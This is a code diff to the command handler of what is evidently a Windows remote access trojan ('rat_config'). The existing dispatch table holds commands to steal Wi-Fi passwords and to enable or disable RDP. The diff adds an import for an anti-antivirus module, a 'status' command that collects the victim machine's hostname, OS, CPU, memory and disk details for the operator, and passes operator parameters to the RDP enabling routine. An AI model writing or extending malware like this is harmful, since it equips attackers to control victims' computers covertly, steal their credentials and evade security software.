@@ -7,12 +7,14 @@ import base64
 import os
 import shutil
 import datetime
+import time  # Added import for time
 import ctypes
 import winreg
 from rat_config import Config
 from monitoring.rdp_controller import RDPController
 from encryption.manager import EncryptionManager
 from network.communicator import ServerCommunicator
+from system.anti_av import AntiAV  # Added import for AntiAV
 
 class CommandError(Exception):
     pass
@@ -36,7 +38,8 @@ class CommandHandler:
             'disable_rdp': CommandHandler.handle_disable_rdp,
             'adjust_behavior': CommandHandler.handle_adjust_behavior,
             'get_wifi_passwords': CommandHandler.handle_wifi_passwords,
-            'cleanup_rdp': CommandHandler.handle_cleanup_rdp
+            'cleanup_rdp': CommandHandler.handle_cleanup_rdp,
+            'status': CommandHandler.handle_status
         }
         
         handler = handlers.get(command_type)
@@ -47,6 +50,26 @@ class CommandHandler:
         
         return handler(params)
     
+    @staticmethod
+    def handle_status(params):
+        try:
+            system_info = {
+                'os': platform.system(),
+                'os_version': platform.release(),
+                'hostname': socket.gethostname(),
+                'cpu_usage': psutil.cpu_percent(interval=1),
+                'memory': psutil.virtual_memory()._asdict(),
+                'disk': psutil.disk_usage('/')._asdict(),
+                'online': True,
+                'last_seen': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),  # Fixed datetime.now()
+                'behavior': Config.behavior if hasattr(Config, 'behavior') else {}
+            }
+            logging.info("Status collected successfully")
+            return system_info
+        except Exception as e:
+            logging.error(f"Failed to collect status: {str(e)}")
+            raise CommandError(f"Failed to collect status: {str(e)}")
+
     @staticmethod
     def handle_cleanup_rdp(params):
         try:
@@ -533,7 +556,7 @@ class CommandHandler:
     def handle_enable_rdp(params):
         try:
             rdp_controller = RDPController(EncryptionManager(Config.ENCRYPTION_KEY))
-            result = rdp_controller.enable_rdp()
+            result = rdp_controller.enable_rdp(params)
             if result["status"] == "success":
                 logging.info("RDP enabled and configured successfully")
                 return result
